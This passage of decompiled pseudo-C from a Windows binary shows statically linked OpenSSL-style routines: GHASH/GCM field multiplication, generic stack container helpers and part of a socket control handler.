  v49 = *(__m64 *)(a2 + 248);
  v50 = *(__m64 *)(a2 + 240);
  v151[14] = v46;
  v152[14] = v47;
  v153[13] = _m_por(_m_psrlqi(v43, 4u), _m_psllqi(v44, 0x3Cu));
  v154[13] = (__int64)_m_psrlqi(v44, 4u);
  v150[15] = 16 * v48;
  v151[15] = v49;
  v152[15] = v50;
  v153[14] = _m_por(_m_psrlqi(v46, 4u), _m_psllqi(v47, 0x3Cu));
  v154[14] = (__int64)_m_psrlqi(v47, 4u);
  v153[15] = _m_por(_m_psrlqi(v49, 4u), _m_psllqi(v50, 0x3Cu));
  v154[15] = (__int64)_m_psrlqi(v50, 4u);
  m64_u64 = (__m64)a1->m64_u64;
  v52 = a1[1].m64_u32[0];
  v53 = a1[1].m64_u32[1];
  do
  {
    v54 = v3[1].m64_i32[1] ^ v53;
    v55 = _m_pxor(m64_u64, (__m64)v3->m64_u64);
    LODWORD(v156) = v3[1].m64_i32[0] ^ v52;
    v155 = v55;
    v158 = v3 + 2;
    v56 = __ROL4__(v54, 8);
    v57 = v56 & 0xF;
    v58 = (unsigned __int8)v56 >> 4;
    v59 = __ROL4__(v56, 8);
    v60 = v151[v57];
    v61 = v152[v57];
    LOBYTE(v57) = v59;
    v62 = _mm_cvtsi64_si32(v60);
    v63 = v57;
    LOBYTE(v57) = v59 & 0xF;
    v63 >>= 4;
    v64 = __ROL4__(v59, 8);
    v65 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v60, 8u), v153[v58]), v151[v57]), _m_psllqi(v61, 0x38u));
    v66 = _m_pxor(_m_pxor(_m_psrlqi(v61, 8u), v152[v57]), (__m64)v154[v58]);
    LOBYTE(v57) = v64;
    v67 = _mm_cvtsi64_si32(v65);
    v68 = (unsigned __int8)(v150[v58] ^ v62);
    v69 = v57;
    LOBYTE(v57) = v64 & 0xF;
    v69 >>= 4;
    v70 = _m_pinsrw(0i64, *((unsigned __int16 *)dword_426580 + v68), 2);
    v71 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v65, 8u), v153[v63]), v151[v57]), _m_psllqi(v66, 0x38u));
    v72 = _m_pxor(_m_pxor(_m_psrlqi(v66, 8u), v152[v57]), (__m64)v154[v63]);
    LOBYTE(v57) = __ROL4__(v64, 8);
    LOBYTE(v68) = _mm_cvtsi64_si32(v71);
    v73 = (unsigned __int8)(v150[v63] ^ v67);
    v74 = v57;
    LOBYTE(v57) = v57 & 0xF;
    v74 >>= 4;
    v75 = _m_pinsrw(0i64, *((unsigned __int16 *)dword_426580 + v73), 2);
    v76 = __ROL4__(v156, 8);
    v77 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v71, 8u), v153[v69]), v151[v57]), _m_psllqi(v72, 0x38u));
    v78 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v72, 8u), v70), v152[v57]), (__m64)v154[v69]);
    LOBYTE(v57) = v76;
    LOBYTE(v73) = _mm_cvtsi64_si32(v77);
    v79 = (unsigned __int8)(v150[v69] ^ v68);
    v80 = v57;
    LOBYTE(v57) = v76 & 0xF;
    v80 >>= 4;
    v81 = _m_pinsrw(0i64, *((unsigned __int16 *)dword_426580 + v79), 2);
    v82 = __ROL4__(v76, 8);
    v83 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v77, 8u), v153[v74]), v151[v57]), _m_psllqi(v78, 0x38u));
    v84 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v78, 8u), v75), v152[v57]), (__m64)v154[v74]);
    LOBYTE(v57) = v82;
    LOBYTE(v79) = _mm_cvtsi64_si32(v83);
    v85 = (unsigned __int8)(v150[v74] ^ v73);
    v86 = v57;
    LOBYTE(v57) = v82 & 0xF;
    v86 >>= 4;
    v87 = _m_pinsrw(v70, *((unsigned __int16 *)dword_426580 + v85), 2);
    v88 = __ROL4__(v82, 8);
    v89 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v83, 8u), v153[v80]), v151[v57]), _m_psllqi(v84, 0x38u));
    v90 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v84, 8u), v81), v152[v57]), (__m64)v154[v80]);
    LOBYTE(v57) = v88;
    LOBYTE(v85) = _mm_cvtsi64_si32(v89);
    v91 = (unsigned __int8)(v150[v80] ^ v79);
    v92 = v57;
    LOBYTE(v57) = v88 & 0xF;
    v92 >>= 4;
    v93 = _m_pinsrw(v75, *((unsigned __int16 *)dword_426580 + v91), 2);
    v94 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v89, 8u), v153[v86]), v151[v57]), _m_psllqi(v90, 0x38u));
    v95 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v90, 8u), v87), v152[v57]), (__m64)v154[v86]);
    LOBYTE(v57) = __ROL4__(v88, 8);
    LOBYTE(v91) = _mm_cvtsi64_si32(v94);
    v96 = (unsigned __int8)(v150[v86] ^ v85);
    v97 = v57;
    LOBYTE(v57) = v57 & 0xF;
    v97 >>= 4;
    v98 = _m_pinsrw(v81, *((unsigned __int16 *)dword_426580 + v96), 2);
    v99 = __ROL4__(v155.m64_i32[1], 8);
    v100 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v94, 8u), v153[v92]), v151[v57]), _m_psllqi(v95, 0x38u));
    v101 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v95, 8u), v93), v152[v57]), (__m64)v154[v92]);
    LOBYTE(v57) = v99;
    LOBYTE(v96) = _mm_cvtsi64_si32(v100);
    v102 = (unsigned __int8)(v150[v92] ^ v91);
    v103 = v57;
    LOBYTE(v57) = v99 & 0xF;
    v103 >>= 4;
    v104 = _m_pinsrw(v87, *((unsigned __int16 *)dword_426580 + v102), 2);
    v105 = __ROL4__(v99, 8);
    v106 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v100, 8u), v153[v97]), v151[v57]), _m_psllqi(v101, 0x38u));
    v107 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v101, 8u), v98), v152[v57]), (__m64)v154[v97]);
    LOBYTE(v57) = v105;
    LOBYTE(v102) = _mm_cvtsi64_si32(v106);
    v108 = (unsigned __int8)(v150[v97] ^ v96);
    v109 = v57;
    LOBYTE(v57) = v105 & 0xF;
    v109 >>= 4;
    v110 = _m_pinsrw(v93, *((unsigned __int16 *)dword_426580 + v108), 2);
    v111 = __ROL4__(v105, 8);
    v112 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v106, 8u), v153[v103]), v151[v57]), _m_psllqi(v107, 0x38u));
    v113 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v107, 8u), v104), v152[v57]), (__m64)v154[v103]);
    LOBYTE(v57) = v111;
    LOBYTE(v108) = _mm_cvtsi64_si32(v112);
    v114 = (unsigned __int8)(v150[v103] ^ v102);
    v115 = v57;
    LOBYTE(v57) = v111 & 0xF;
    v115 >>= 4;
    v116 = _m_pinsrw(v98, *((unsigned __int16 *)dword_426580 + v114), 2);
    v117 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v112, 8u), v153[v109]), v151[v57]), _m_psllqi(v113, 0x38u));
    v118 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v113, 8u), v110), v152[v57]), (__m64)v154[v109]);
    LOBYTE(v57) = __ROL4__(v111, 8);
    LOBYTE(v114) = _mm_cvtsi64_si32(v117);
    v119 = (unsigned __int8)(v150[v109] ^ v108);
    v120 = v57;
    LOBYTE(v57) = v57 & 0xF;
    v120 >>= 4;
    v121 = _m_pinsrw(v104, *((unsigned __int16 *)dword_426580 + v119), 2);
    v122 = __ROL4__(v155.m64_i32[0], 8);
    v123 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v117, 8u), v153[v115]), v151[v57]), _m_psllqi(v118, 0x38u));
    v124 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v118, 8u), v116), v152[v57]), (__m64)v154[v115]);
    LOBYTE(v57) = v122;
    LOBYTE(v119) = _mm_cvtsi64_si32(v123);
    v125 = (unsigned __int8)(v150[v115] ^ v114);
    v126 = v57;
    LOBYTE(v57) = v122 & 0xF;
    v126 >>= 4;
    v127 = _m_pinsrw(v110, *((unsigned __int16 *)dword_426580 + v125), 2);
    v128 = __ROL4__(v122, 8);
    v129 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v123, 8u), v153[v120]), v151[v57]), _m_psllqi(v124, 0x38u));
    v130 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v124, 8u), v121), v152[v57]), (__m64)v154[v120]);
    LOBYTE(v57) = v128;
    LOBYTE(v125) = _mm_cvtsi64_si32(v129);
    v131 = (unsigned __int8)(v150[v120] ^ v119);
    v132 = v57;
    LOBYTE(v57) = v128 & 0xF;
    v132 >>= 4;
    v133 = _m_pinsrw(v116, *((unsigned __int16 *)dword_426580 + v131), 2);
    v134 = __ROL4__(v128, 8);
    v135 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v129, 8u), v153[v126]), v151[v57]), _m_psllqi(v130, 0x38u));
    v136 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v130, 8u), v127), v152[v57]), (__m64)v154[v126]);
    LOBYTE(v57) = v134;
    LOBYTE(v131) = _mm_cvtsi64_si32(v135);
    v137 = (unsigned __int8)(v150[v126] ^ v125);
    v138 = v57;
    LOBYTE(v57) = v134 & 0xF;
    v138 >>= 4;
    v139 = _m_pinsrw(v121, *((unsigned __int16 *)dword_426580 + v137), 2);
    v140 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v135, 8u), v153[v132]), v151[v57]), _m_psllqi(v136, 0x38u));
    v141 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v136, 8u), v133), v152[v57]), (__m64)v154[v132]);
    LOBYTE(v57) = __ROL4__(v134, 8);
    LOBYTE(v137) = _mm_cvtsi64_si32(v140);
    v142 = (unsigned __int8)(v150[v132] ^ v131);
    v143 = v57;
    LOBYTE(v57) = v57 & 0xF;
    v143 >>= 4;
    v144 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v140, 8u), v153[v138]), v151[v57]), _m_psllqi(v141, 0x38u));
    v145 = _m_psllqi(_m_pinsrw(v127, *((unsigned __int16 *)dword_426580 + v142), 2), 4u);
    LOBYTE(v142) = _mm_cvtsi64_si32(v144);
    v146 = _m_pxor(_m_pxor(_m_pxor(_m_psrlqi(v141, 8u), v139), v152[v57]), (__m64)v154[v138]);
    v147 = _m_pxor(_m_pxor(_m_psrlqi(v144, 4u), v151[v143]), _m_psllqi(v146, 0x3Cu));
    v148 = _m_pxor(
             _m_pxor(
               _m_pxor(_m_pxor(_m_psrlqi(v146, 4u), v152[v143]), v145),
               _m_psllqi(
                 _m_pinsrw(v133, *((unsigned __int16 *)dword_426580 + (unsigned __int8)(v150[v138] ^ v137)), 2),
                 0xCu)),
             _m_pinsrw(0i64, *((unsigned __int16 *)dword_426580 + (unsigned __int8)(16 * v142)), 3));
    v3 = v158;
    v53 = _byteswap_ulong(_mm_cvtsi64_si32(v147));
    m64_u64 = _m_pshufw(_m_por(_m_psllwi(v148, 8u), _m_psrlwi(v148, 8u)), 27);
    v52 = _byteswap_ulong(_mm_cvtsi64_si32(_m_psrlqi(v147, 0x20u)));
  }
  while ( v158 != v159 );
  result = v157;
  v157[1].m64_i32[1] = v53;
  result[1].m64_i32[0] = v52;
  result->m64_u64 = (unsigned __int64)m64_u64;
  _m_empty();
  return result;
}
// 426580: using guessed type int dword_426580[128];
// 425740: using guessed type __m64 var_1A0[16];
// 425740: using guessed type __m64 var_220[16];
// 425740: using guessed type __m64 var_120[16];

//----- (00426050) --------------------------------------------------------
const __m128i *__cdecl sub_426050(__m128i *a1, const __m128i *a2)
{
  const __m128i *result; // eax
  __m128i v3; // xmm2
  __m128i v11; // xmm4
  __m128i v12; // xmm1
  __m128i v13; // xmm4
  __m128i v14; // xmm0
  __m128i v15; // xmm3
  __m128i v16; // xmm4
  __m128i v17; // xmm0
  __m128i v18; // xmm0

  result = a2;
  v3 = _mm_shuffle_epi32(_mm_loadu_si128(a2), 78);
  _XMM2 = _mm_xor_si128(
            _mm_or_si128(_mm_slli_epi64(v3, 1u), _mm_slli_si128(_mm_srli_epi64(v3, 0x3Fu), 8)),
            _mm_and_si128(_mm_cmpgt_epi32((__m128i)0i64, _mm_shuffle_epi32(v3, 255)), *(__m128i *)&dword_426540[4]));
  _XMM1 = _XMM2;
  _XMM3 = _mm_xor_si128(_mm_shuffle_epi32(_XMM2, 78), _XMM2);
  _XMM4 = _XMM3;
  __asm
  {
    pclmulqdq xmm0, xmm2, 0
    pclmulqdq xmm1, xmm2, 11h
    pclmulqdq xmm3, xmm4, 0
  }
  v11 = (__m128i)_mm_xor_ps(_mm_xor_ps(_XMM3, _XMM0), _XMM1);
  v12 = _mm_xor_si128((__m128i)_XMM1, _mm_srli_si128(v11, 8));
  v13 = _mm_xor_si128((__m128i)_XMM0, _mm_slli_si128(v11, 8));
  v14 = _mm_slli_epi64(v13, 5u);
  v15 = _mm_slli_epi64(_mm_xor_si128(_mm_slli_epi64(v14, 1u), _mm_xor_si128(v13, v14)), 0x39u);
  v16 = _mm_xor_si128(_mm_slli_si128(v15, 8), v13);
  v17 = _mm_srli_epi64(v16, 1u);
  v18 = _mm_xor_si128(
          _mm_srli_epi64(_mm_xor_si128(_mm_srli_epi64(v17, 5u), _mm_xor_si128(v16, v17)), 1u),
          _mm_xor_si128(_mm_xor_si128(v12, _mm_srli_si128(v15, 8)), v16));
  *a1 = _XMM2;
  a1[1] = v18;
  a1[2] = _mm_alignr_epi8(
            _mm_xor_si128(_mm_shuffle_epi32(v18, 78), v18),
            _mm_xor_si128(_mm_shuffle_epi32(_XMM2, 78), _XMM2),
            8);
  return result;
}
// 426540: using guessed type int dword_426540[7];

//----- (00426170) --------------------------------------------------------
__int64 __cdecl sub_426170(__int64 a1)
{
  __int64 result; // rax
  __m128i si128; // xmm5
  __m128i v10; // xmm4
  __m128i v11; // xmm1
  __m128i v12; // xmm4
  __m128i v13; // xmm0
  __m128i v14; // xmm3
  __m128i v15; // xmm4
  __m128i v16; // xmm0

  result = a1;
  si128 = _mm_load_si128((const __m128i *)dword_426540);
  _XMM2 = *(_OWORD *)HIDWORD(a1);
  _XMM4 = *(_OWORD *)(HIDWORD(a1) + 32);
  _XMM1 = _mm_shuffle_epi8(_mm_loadu_si128((const __m128i *)a1), si128);
  _XMM3 = _mm_xor_si128(_mm_shuffle_epi32(_XMM1, 78), _XMM1);
  __asm
  {
    pclmulqdq xmm0, xmm2, 0
    pclmulqdq xmm1, xmm2, 11h
    pclmulqdq xmm3, xmm4, 0
  }
  v10 = (__m128i)_mm_xor_ps(_mm_xor_ps(_XMM3, _XMM0), _XMM1);
  v11 = _mm_xor_si128((__m128i)_XMM1, _mm_srli_si128(v10, 8));
  v12 = _mm_xor_si128((__m128i)_XMM0, _mm_slli_si128(v10, 8));
  v13 = _mm_slli_epi64(v12, 5u);
  v14 = _mm_slli_epi64(_mm_xor_si128(_mm_slli_epi64(v13, 1u), _mm_xor_si128(v12, v13)), 0x39u);
  v15 = _mm_xor_si128(_mm_slli_si128(v14, 8), v12);
  v16 = _mm_srli_epi64(v15, 1u);
  *(__m128i *)a1 = _mm_shuffle_epi8(
                     _mm_xor_si128(
                       _mm_srli_epi64(_mm_xor_si128(_mm_srli_epi64(v16, 5u), _mm_xor_si128(v15, v16)), 1u),
                       _mm_xor_si128(_mm_xor_si128(v11, _mm_srli_si128(v14, 8)), v15)),
                     si128);
  return result;
}
// 426540: using guessed type int dword_426540[7];

//----- (00426240) --------------------------------------------------------
__int64 __cdecl sub_426240(__int64 a1, const __m128i *a2, int a3)
{
  __int64 result; // rax
  const __m128i *v4; // esi
  __m128i si128; // xmm5
  __m128i v7; // xmm0
  __m128i v8; // xmm3
  unsigned int v18; // ebx
  __m128i v25; // xmm0
  __m128i v26; // xmm5
  __m128i v27; // xmm1
  __m128i v28; // xmm3
  __m128i v29; // xmm1
  __m128i v31; // xmm4
  __m128i v32; // xmm0
  __m128i v33; // xmm3
  __m128i v34; // xmm1
  __m128i v35; // xmm4
  __m128i v36; // xmm0
  bool v38; // cc
  __m128i v44; // xmm0
  __m128i v45; // xmm1
  __m128i v46; // xmm3
  __m128i v47; // xmm1
  __m128i v48; // xmm4
  __m128i v49; // xmm0
  __m128i v50; // xmm3
  __m128i v51; // xmm4
  __m128i v52; // xmm0
  __m128i v59; // xmm4
  __m128i v60; // xmm1
  __m128i v61; // xmm4
  __m128i v62; // xmm0
  __m128i v63; // xmm3
  __m128i v64; // xmm4
  __m128i v65; // xmm0

  result = a1;
  v4 = a2;
  si128 = _mm_load_si128((const __m128i *)dword_426540);
  _XMM2 = _mm_loadu_si128((const __m128i *)HIDWORD(a1));
  v7 = _mm_shuffle_epi8(_mm_loadu_si128((const __m128i *)a1), si128);
  if ( a3 == 16 )
    goto LABEL_6;
  v8 = _mm_shuffle_epi8(_mm_loadu_si128(a2), si128);
  _XMM6 = _mm_shuffle_epi8(_mm_loadu_si128(a2 + 1), si128);
  _XMM5 = _mm_loadu_si128((const __m128i *)(HIDWORD(a1) + 32));
  _XMM0 = _mm_xor_si128(v7, v8);
  _XMM7 = _XMM6;
  _XMM3 = _mm_xor_si128(_mm_shuffle_epi32(_XMM6, 78), _XMM6);
  v4 = a2 + 2;
  __asm
  {
    pclmulqdq xmm6, xmm2, 0
    pclmulqdq xmm7, xmm2, 11h
    pclmulqdq xmm3, xmm5, 0
  }
  _XMM2 = *(_OWORD *)(HIDWORD(a1) + 16);
  v18 = a3 - 48;
  if ( (unsigned int)(a3 - 16) > 0x20 )
  {
    do
    {
      _XMM1 = _XMM0;
      _XMM4 = _mm_xor_si128(_mm_shuffle_epi32(_XMM0, 78), _XMM0);
      __asm
      {
        pclmulqdq xmm0, xmm2, 0
        pclmulqdq xmm1, xmm2, 11h
        pclmulqdq xmm4, xmm5, 10h
      }
      _XMM2 = *(_OWORD *)HIDWORD(a1);
      v25 = (__m128i)_mm_xor_ps(_XMM0, _XMM6);
      v26 = _mm_load_si128((const __m128i *)dword_426540);
      v27 = (__m128i)_mm_xor_ps(_XMM1, _XMM7);
      v28 = _mm_xor_si128(_XMM4, _mm_xor_si128(_mm_xor_si128(_XMM3, v25), v27));
      v29 = _mm_xor_si128(_mm_xor_si128(v27, _mm_srli_si128(v28, 8)), _mm_shuffle_epi8(_mm_loadu_si128(v4), v26));
      _XMM7 = _mm_shuffle_epi8(_mm_loadu_si128(v4 + 1), v26);
      v31 = _mm_xor_si128(v25, _mm_slli_si128(v28, 8));
      v32 = _mm_slli_epi64(v31, 5u);
      __asm { pclmulqdq xmm6, xmm2, 0 }
      _XMM5 = *(__m128i *)(HIDWORD(a1) + 32);
      v33 = _mm_slli_epi64(_mm_xor_si128(_mm_slli_epi64(v32, 1u), _mm_xor_si128(v31, v32)), 0x39u);
      v34 = _mm_xor_si128(v29, _mm_srli_si128(v33, 8));
      v35 = _mm_xor_si128(_mm_slli_si128(v33, 8), v31);
      v36 = _mm_srli_epi64(v35, 1u);
      _XMM3 = _mm_xor_si128(_mm_shuffle_epi32(_XMM7, 78), _XMM7);
      __asm { pclmulqdq xmm7, xmm2, 11h }
      _XMM2 = *(_OWORD *)(HIDWORD(a1) + 16);
      _XMM0 = _mm_xor_si128(
                _mm_srli_epi64(_mm_xor_si128(_mm_srli_epi64(v36, 5u), _mm_xor_si128(v35, v36)), 1u),
                _mm_xor_si128(v34, v35));
      __asm { pclmulqdq xmm3, xmm5, 0 }
      v4 += 2;
      v38 = v18 <= 0x20;
      v18 -= 32;
    }
    while ( !v38 );
  }
  _XMM1 = _XMM0;
  _XMM4 = _mm_xor_si128(_mm_shuffle_epi32(_XMM0, 78), _XMM0);
  __asm
  {
    pclmulqdq xmm0, xmm2, 0
    pclmulqdq xmm1, xmm2, 11h
    pclmulqdq xmm4, xmm5, 10h
  }
  si128 = _mm_load_si128((const __m128i *)dword_426540);
  v44 = (__m128i)_mm_xor_ps(_XMM0, _XMM6);
  v45 = (__m128i)_mm_xor_ps(_XMM1, _XMM7);
  v46 = _mm_xor_si128(_XMM4, _mm_xor_si128(_mm_xor_si128(_XMM3, v44), v45));
  v47 = _mm_xor_si128(v45, _mm_srli_si128(v46, 8));
  v48 = _mm_xor_si128(v44, _mm_slli_si128(v46, 8));
  v49 = _mm_slli_epi64(v48, 5u);
  v50 = _mm_slli_epi64(_mm_xor_si128(_mm_slli_epi64(v49, 1u), _mm_xor_si128(v48, v49)), 0x39u);
  v51 = _mm_xor_si128(_mm_slli_si128(v50, 8), v48);
  v52 = _mm_srli_epi64(v51, 1u);
  v7 = _mm_xor_si128(
         _mm_srli_epi64(_mm_xor_si128(_mm_srli_epi64(v52, 5u), _mm_xor_si128(v51, v52)), 1u),
         _mm_xor_si128(_mm_xor_si128(v47, _mm_srli_si128(v50, 8)), v51));
  if ( !v18 )
  {
    _XMM2 = *(__m128i *)HIDWORD(a1);
LABEL_6:
    _XMM1 = _mm_xor_si128(v7, _mm_shuffle_epi8(_mm_loadu_si128(v4), si128));
    _XMM3 = _mm_xor_si128(_mm_shuffle_epi32(_XMM1, 78), _XMM1);
    _XMM4 = _mm_xor_si128(_mm_shuffle_epi32(_XMM2, 78), _XMM2);
    __asm
    {
      pclmulqdq xmm0, xmm2, 0
      pclmulqdq xmm1, xmm2, 11h
      pclmulqdq xmm3, xmm4, 0
    }
    v59 = (__m128i)_mm_xor_ps(_mm_xor_ps(_XMM3, _XMM0), _XMM1);
    v60 = _mm_xor_si128((__m128i)_XMM1, _mm_srli_si128(v59, 8));
    v61 = _mm_xor_si128((__m128i)_XMM0, _mm_slli_si128(v59, 8));
    v62 = _mm_slli_epi64(v61, 5u);
    v63 = _mm_slli_epi64(_mm_xor_si128(_mm_slli_epi64(v62, 1u), _mm_xor_si128(v61, v62)), 0x39u);
    v64 = _mm_xor_si128(_mm_slli_si128(v63, 8), v61);
    v65 = _mm_srli_epi64(v64, 1u);
    v7 = _mm_xor_si128(
           _mm_srli_epi64(_mm_xor_si128(_mm_srli_epi64(v65, 5u), _mm_xor_si128(v64, v65)), 1u),
           _mm_xor_si128(_mm_xor_si128(v60, _mm_srli_si128(v63, 8)), v64));
  }
  *(__m128i *)a1 = _mm_shuffle_epi8(v7, si128);
  return result;
}
// 426540: using guessed type int dword_426540[7];

//----- (00426840) --------------------------------------------------------
int __cdecl sub_426840(int a1, int a2)
{
  int result; // eax

  result = *(_DWORD *)(a1 + 16);
  *(_DWORD *)(a1 + 16) = a2;
  if ( result != a2 )
    *(_DWORD *)(a1 + 8) = 0;
  return result;
}

//----- (00426860) --------------------------------------------------------
_DWORD *__cdecl sub_426860(int a1)
{
  _DWORD *v1; // esi
  void *v2; // eax

  v1 = sub_413430(0x14u);
  if ( v1 && (v2 = sub_413430(0x10u), (v1[1] = v2) != 0) )
  {
    v1[4] = a1;
    v1[3] = 4;
    return v1;
  }
  else
  {
    sub_413490(v1);
    return 0;
  }
}

//----- (004268C0) --------------------------------------------------------
int __cdecl sub_4268C0(int *a1, int a2, int a3)
{
  int result; // eax
  int v4; // eax
  void *v5; // eax
  int v6; // ecx
  int v7; // eax

  if ( !a1 )
    return 0;
  v4 = a1[3];
  if ( v4 <= *a1 + 1 )
  {
    v5 = sub_413500((void *)a1[1], 8 * v4, (int)"crypto\\stack\\stack.c", 122);
    if ( !v5 )
      return 0;
    v6 = a1[3];
    a1[1] = (int)v5;
    a1[3] = 2 * v6;
  }
  v7 = *a1;
  if ( a3 >= *a1 || a3 < 0 )
  {
    *(_DWORD *)(a1[1] + 4 * v7) = a2;
    result = ++*a1;
    a1[2] = 0;
  }
  else
  {
    memcpy_0((void *)(a1[1] + 4 * a3 + 4), (const void *)(a1[1] + 4 * a3), 4 * (v7 - a3));
    *(_DWORD *)(a1[1] + 4 * a3) = a2;
    result = ++*a1;
    a1[2] = 0;
  }
  return result;
}

//----- (00426960) --------------------------------------------------------
int __cdecl sub_426960(int *a1, int a2)
{
  int v2; // eax
  int *v3; // edx
  int v4; // edi

  if ( !a1 )
    return 0;
  if ( a2 < 0 )
    return 0;
  v2 = *a1;
  if ( a2 >= *a1 )
    return 0;
  v3 = (int *)(a1[1] + 4 * a2);
  v4 = *v3;
  if ( a2 != v2 - 1 )
    memcpy_0(v3, v3 + 1, 4 * (v2 - a2) - 4);
  --*a1;
  return v4;
}

//----- (004269B0) --------------------------------------------------------
int __cdecl sub_4269B0(int *a1, int a2)
{
  return sub_4268C0(a1, a2, *a1);
}

//----- (004269D0) --------------------------------------------------------
int __cdecl sub_4269D0(int *a1)
{
  if ( a1 && *a1 > 0 )
    return sub_426960(a1, *a1 - 1);
  else
    return 0;
}

//----- (004269F0) --------------------------------------------------------
void __cdecl sub_4269F0(void **Block)
{
  if ( Block )
  {
    sub_413490(Block[1]);
    sub_413490(Block);
  }
}

//----- (00426A30) --------------------------------------------------------
int __cdecl sub_426A30(int a1)
{
  if ( a1 )
    return *(_DWORD *)a1;
  else
    return -1;
}

//----- (00426A40) --------------------------------------------------------
int __cdecl sub_426A40(int *a1, int a2)
{
  if ( a1 && a2 >= 0 && a2 < *a1 )
    return *(_DWORD *)(a1[1] + 4 * a2);
  else
    return 0;
}

//----- (00426A60) --------------------------------------------------------
int __cdecl sub_426A60(int *a1, int a2, int a3)
{
  if ( !a1 || a2 < 0 || a2 >= *a1 )
    return 0;
  *(_DWORD *)(a1[1] + 4 * a2) = a3;
  return *(_DWORD *)(a1[1] + 4 * a2);
}

//----- (00426A90) --------------------------------------------------------
void __cdecl sub_426A90(int a1)
{
  if ( a1 && !*(_DWORD *)(a1 + 8) )
  {
    if ( *(_DWORD *)(a1 + 16) )
    {
      qsort(*(void **)(a1 + 4), *(_DWORD *)a1, 4u, *(_CoreCrtNonSecureSearchSortCompareFunction *)(a1 + 16));
      *(_DWORD *)(a1 + 8) = 1;
    }
  }
}

//----- (00426AD0) --------------------------------------------------------
int __cdecl sub_426AD0(int a1)
{
  if ( a1 )
    return *(_DWORD *)(a1 + 8);
  else
    return 1;
}

//----- (00426AF0) --------------------------------------------------------
_DWORD *sub_426AF0()
{
  return sub_426860(0);
}

//----- (00426B00) --------------------------------------------------------
int __cdecl sub_426B00(int *a1, int a2)
{
  int v2; // edx
  int v3; // eax
  _DWORD *i; // ecx
  int *v6; // ecx
  int v7; // edi

  v2 = *a1;
  v3 = 0;
  if ( *a1 <= 0 )
    return 0;
  for ( i = (_DWORD *)a1[1]; *i != a2; ++i )
  {
    if ( ++v3 >= v2 )
      return 0;
  }
  if ( v3 < 0 || v3 >= v2 )
    return 0;
  v6 = (int *)(a1[1] + 4 * v3);
  v7 = *v6;
  if ( v3 != v2 - 1 )
    memcpy_0(v6, v6 + 1, 4 * (v2 - v3) - 4);
  --*a1;
  return v7;
}

//----- (00426B60) --------------------------------------------------------
int __usercall sub_426B60@<eax>(int a1@<esi>, int a2, char a3)
{
  int v3; // edx
  int result; // eax
  _DWORD *i; // ecx
  int v6; // eax

  v3 = a2;
  if ( !a1 )
    return -1;
  result = *(_DWORD *)(a1 + 16);
  if ( result )
  {
    if ( !*(_DWORD *)(a1 + 8) )
    {
      qsort(*(void **)(a1 + 4), *(_DWORD *)a1, 4u, *(_CoreCrtNonSecureSearchSortCompareFunction *)(a1 + 16));
      v3 = a2;
      *(_DWORD *)(a1 + 8) = 1;
    }
    if ( v3 )
    {
      v6 = sub_423580((int)&a2, *(_DWORD *)(a1 + 4), *(_DWORD *)a1, 4, *(int (__cdecl **)(int, int))(a1 + 16), a3);
      if ( v6 )
        return (v6 - *(_DWORD *)(a1 + 4)) >> 2;
    }
    return -1;
  }
  if ( *(int *)a1 <= 0 )
    return -1;
  for ( i = *(_DWORD **)(a1 + 4); *i != a2; ++i )
  {
    if ( ++result >= *(_DWORD *)a1 )
      return -1;
  }
  return result;
}

//----- (00426BE0) --------------------------------------------------------
int __cdecl sub_426BE0(int a1, int a2)
{
  return sub_426B60(a1, a2, 2);
}

//----- (00426C00) --------------------------------------------------------
void __cdecl sub_426C00(void *Block, void (__cdecl *a2)(_DWORD))
{
  int i; // esi
  int v3; // eax
  bool v4; // zf
  _DWORD *v5; // eax

  if ( Block )
  {
    for ( i = 0; i < *(_DWORD *)Block; ++i )
    {
      v3 = *((_DWORD *)Block + 1);
      v4 = *(_DWORD *)(v3 + 4 * i) == 0;
      v5 = (_DWORD *)(v3 + 4 * i);
      if ( !v4 )
        a2(*v5);
    }
    sub_413490(*((void **)Block + 1));
    sub_413490(Block);
  }
}

//----- (00426C60) --------------------------------------------------------
BOOL __cdecl sub_426C60(SOCKET s)
{
  return closesocket(s) >= 0;
}

//----- (00426C80) --------------------------------------------------------
int __cdecl sub_426C80(_DWORD *a1)
{
  a1[3] = 0;
  a1[7] = 0;
  a1[8] = 0;
  a1[5] = 0;
  return 1;
}

//----- (00426CA0) --------------------------------------------------------
int __cdecl sub_426CA0(_DWORD *a1)
{
  if ( !a1 )
    return 0;
  if ( a1[4] )
  {
    if ( a1[3] )
      sub_426C60(a1[7]);
    a1[3] = 0;
    a1[5] = 0;
  }
  return 1;
}

//----- (00426CE0) --------------------------------------------------------
int __cdecl sub_426CE0(_DWORD *a1, int a2, int a3, int *a4)
{
  int v4; // edx
  int result; // eax

  switch ( a2 )
  {
    case 8:
      result = a1[4];
      break;
    case 9:
      a1[4] = a3;
      goto LABEL_10;
    case 11:
    case 12:
LABEL_10:
      result = 1;
      break;
    case 104:
      sub_426CA0(a1);
      v4 = *a4;
      a1[4] = a3;
      a1[3] = 1;
      a1[7] = v4;
      result = 1;
      break;
    case 105:
      if ( a1[3] )
      {
        if ( a4 )
          *a4 = a1[7];
        result = a1[7];
